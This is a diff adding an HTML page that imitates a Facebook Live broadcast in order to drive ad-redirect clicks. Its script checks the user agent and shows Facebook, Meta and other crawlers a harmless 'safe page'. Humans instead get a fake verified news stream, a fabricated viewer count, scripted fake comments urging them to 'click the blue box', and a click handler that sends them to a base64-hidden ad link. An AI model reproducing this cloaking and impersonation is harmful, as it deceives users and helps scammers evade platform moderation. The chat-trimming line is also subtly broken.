@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Live Simulation</title>
+    <style>
+        :root { --fb-blue: #1877F2; --fb-gray: #3A3B3C; }
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: -apple-system, system-ui, sans-serif; }
+        body { background: #000; color: #fff; overflow: hidden; height: 100vh; }
+
+        /* SAFE PAGE - Ringkas & Gaya Terminal */
+        #safe-page { display: flex; align-items: center; justify-content: center; height: 100vh; background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 14px; line-height: 1.8; }
+
+        /* FB LIVE UI */
+        #money-page { display: none; position: relative; height: 100vh; width: 100vw; max-width: 500px; margin: 0 auto; overflow: hidden; cursor: pointer; }
+        .video-bg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; background: #111; }
+        .overlay { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; background: linear-gradient(to bottom, rgba(0,0,0,0.65) 0%, transparent 35%, transparent 65%, rgba(0,0,0,0.9) 100%); }
+
+        /* Header */
+        .header { padding: 12px; display: flex; align-items: center; justify-content: space-between; }
+        .user-meta { display: flex; gap: 10px; align-items: center; }
+        .avatar-main, .msg-avatar { 
+            width: 42px; height: 42px; border-radius: 50%; 
+            background-size: cover; background-position: center;
+            border: 2px solid var(--fb-blue); background-color: #333;
+        }
+        .msg-avatar { width: 32px; height: 32px; border: none; }
+
+        .host-title { display: flex; align-items: center; gap: 4px; font-weight: 800; font-size: 15px; }
+        .verified-badge { width: 16px; height: 16px; }
+        .live-tag { background: #f02849; padding: 2px 8px; border-radius: 2px; font-size: 11px; font-weight: 800; }
+        .v-count { background: rgba(0,0,0,0.6); padding: 2px 8px; border-radius: 2px; font-size: 11px; margin-left: 5px; font-weight: 600; }
+
+        /* Footer & Chat */
+        .footer { margin-top: auto; padding: 15px; }
+        #chat-list { max-height: 160px; overflow: hidden; display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .msg-item { display: flex; gap: 10px; align-items: flex-start; animation: fbFade 0.4s ease; }
+        .msg-bubble { background: rgba(255,255,255,0.22); padding: 8px 12px; border-radius: 18px; line-height: 1.3; }
+        .msg-user { font-size: 12px; font-weight: 800; margin-bottom: 2px; }
+        .msg-text { font-size: 13px; color: #f1f1f1; }
+
+        /* Hook Adsterra */
+        .hook-box { background: var(--fb-blue); color: #fff; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 800; text-align: center; margin-bottom: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); animation: pulse 1.8s infinite; }
+
+        @keyframes fbFade { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(0.97); filter: brightness(1.1); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+    <!-- Safe Page -->
+    <div id="safe-page">
+        <div>
+            &gt; Booting...<br>
+            &gt; Accessing server...<br>
+            &gt; Checking... <span id="status" style="color: #ffcc00;">WAIT</span>
+        </div>
+    </div>
+
+    <!-- Money Page -->
+    <div id="money-page" onclick="goLink()">
+        <video id="myVideo" class="video-bg" autoplay muted loop playsinline preload="auto">
+            <source src="https://cdn.aceimg.com/a6bef63e9.mp4" type="video/mp4">
+        </video>
+        <div class="overlay">
+            <div class="header">
+                <div class="user-meta">
+                    <div class="avatar-main" style="background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAS0lEQVR42u3PAQ0AAAgDILe/tCV28IEG6No6S0REpChIRESkKEhERKQoSEREpChIRESkKEhERKQoSEREpChIRESkKEhERKQoSFy8BgB3H898S9WlAAAAAElFTkSuQmCC');"></div>
+                    <div>
+                        <div class="host-title">
+                            Breaking News 24/7
+                            <svg class="verified-badge" viewBox="0 0 24 24" fill="#1877F2">
+                                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zM9.8 17.3l-4.2-4.1L7 11.8l2.8 2.7L17 7.4l1.4 1.4-8.6 8.5z"/>
+                            </svg>
+                        </div>
+                        <div style="display:flex; align-items:center; margin-top:2px;">
+                            <span class="live-tag">LIVE</span>
+                            <span class="v-count">👁️ <span id="v-count">482</span></span>
+                        </div>
+                    </div>
+                </div>
+                <div style="font-size:22px; opacity:0.7;">✕</div>
+            </div>
+
+            <div class="footer">
+                <div id="chat-list"></div>
+                <div class="hook-box">⚠️ TRENDING: Watch the full report before it's taken down! 👇</div>
+                <div style="background:rgba(255,255,255,0.15); border-radius:20px; padding:10px 15px; font-size:14px; color:#ccc; display:flex; justify-content:space-between; border: 1px solid rgba(255,255,255,0.1);">
+                    <span>Write a comment...</span>
+                    <span>💙 👍 ❤️</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- ADSTERRA DIRECT LINK ---
+        const adsterra_link = "https://seenimplieddump.com/v08rufrhf?key=e2605deb92284ad0448801991b20019a";
+        const encoded_target = btoa(adsterra_link); 
+
+        function goLink() { window.location.href = atob(encoded_target); }
+
+        function antiBot() {
+            const ua = navigator.userAgent.toLowerCase();
+            const isBot = /bot|facebook|twitter|meta|crawler|spider|headless|externalhit/i.test(ua);
+            
+            if (!isBot) {
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "OK";
+                    document.getElementById('status').style.color = "#00ff41";
+                    setTimeout(() => {
+                        document.getElementById('safe-page').style.display = 'none';
+                        document.getElementById('money-page').style.display = 'block';
+                        initLive();
+                    }, 400);
+                }, 800);
+            }
+        }
+
+        function initLive() {
+            // Play video on first touch
+            document.body.addEventListener('touchstart', () => {
+                const v = document.getElementById('myVideo');
+                if(v) v.play();
+            }, {once: true});
+
+            const faceBase64 = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAAgACAMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAAFBgIDBAEHAP/EADMQAAIBAgQEAwYFBQAAAAAAAAECAwQRAAUSIRMxQVEGImFxgZGhscHRFDJC4fAVI1Ji/8QAGQEAAwEBAQAAAAAAAAAAAAAAAgMEBQEA/8QAIhEAAgIBBAIDAAAAAAAAAAAAAQIAEQMEEiExE0EiUWFx/9oADAMBAAIRAxEAPwD6U8vLGPFpSMeDAnM6hM//2Q==";
+
+            const chatData = [
+                {n: "Robert Miller", m: "Is this real?? Unbelievable!"},
+                {n: "Sarah J.", m: "I'm so glad I caught this live 😱"},
+                {n: "Mark Stevens", m: "Does anyone have the full link?"},
+                {n: "Jessica_W", m: "Click the blue box, it works!"}
+            ];
+
+            setInterval(() => {
+                const u = chatData[Math.floor(Math.random() * chatData.length)];
+                const list = document.getElementById('chat-list');
+                const d = document.createElement('div');
+                d.className = 'msg-item';
+                d.innerHTML = `<div class="msg-avatar" style="background-image:url('${faceBase64}')"></div><div class="msg-bubble"><div class="msg-user">${u.n}</div><div class="msg-text">${u.m}</div></div>`;
+                list.appendChild(d);
+                if(list.children.length > 3) list.removeChild(list.children);
+            }, 4000);
+
+            let v = 482;
+            setInterval(() => {
+                v += Math.floor(Math.random() * 7) - 3;
+                document.getElementById('v-count').innerText = Math.max(450, Math.min(v, 495));
+            }, 2500);
+        }
+
+        window.onload = antiBot;
+    </script>
+</body>
+</html>
